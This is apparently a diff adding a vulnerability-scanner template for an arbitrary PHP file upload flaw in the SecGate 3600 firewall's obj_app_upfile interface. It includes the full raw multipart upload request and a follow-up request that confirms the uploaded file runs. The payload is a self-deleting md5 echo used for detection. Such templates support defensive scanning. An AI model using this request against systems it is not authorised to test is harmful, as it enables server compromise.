@@ -1,0 +1,61 @@
+id: secgate-3600-file-upload
+
+info:
+  name: SecGate 3600 Firewall obj_app_upfile - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: |
+    There is an arbitrary file upload vulnerability in the obj_app_upfile interface of Internet SecGate 3600 firewall. An attacker can obtain server permissions by constructing a special request package.
+  reference:
+    - https://peiqi.wgpsec.org/wiki/iot/%E5%A5%87%E5%AE%89%E4%BF%A1/%E7%BD%91%E7%A5%9E%20SecGate%203600%20%E9%98%B2%E7%81%AB%E5%A2%99%20obj_app_upfile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/%E5%A5%87%E5%AE%89%E4%BF%A1/%E7%BD%91%E7%A5%9E%20SecGate%203600%20%E9%98%B2%E7%81%AB%E5%A2%99%20obj_app_upfile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: "true"
+    max-request: 2
+    fofa-query: fid="1Lh1LHi6yfkhiO83I59AYg=="
+  tags: secgate,3600,firewall,file-upload,intrusive
+variables:
+  filename: "{{rand_base(6)}}"
+  file-upload: "{{rand_base(5)}}"
+  string: "secgate-3600-file-upload"
+
+http:
+  - raw:
+      - |
+        POST /?g=obj_app_upfile HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{string}}
+        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
+
+        ------WebKitFormBoundary{{string}}
+        Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundary{{string}}
+        Content-Disposition: form-data; name="upfile"; filename="{{filename}}.php"
+        Content-Type: text/plain
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+
+        ------WebKitFormBoundary{{string}}
+        Content-Disposition: form-data; name="submit_post"
+
+        obj_app_upfile
+        ------WebKitFormBoundary{{string}}
+        Content-Disposition: form-data; name="__hash__"
+
+        0b9d6b1ab7479ab69d9f71b05e0e9445
+        ------WebKitFormBoundary{{string}}--
+      - |
+        GET /attachements/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{md5(string)}}'
+# digest: 4a0a0047304502206082371c0739060957c4f91eff8283edfd6315af8e508eba2dc8ee09dd4da590022100937f99e558900a9b0ef2836b874a9ee6089d2da556e4c9bec83b6faea3f5e322:922c64590222798bb761d5b6d8e72950
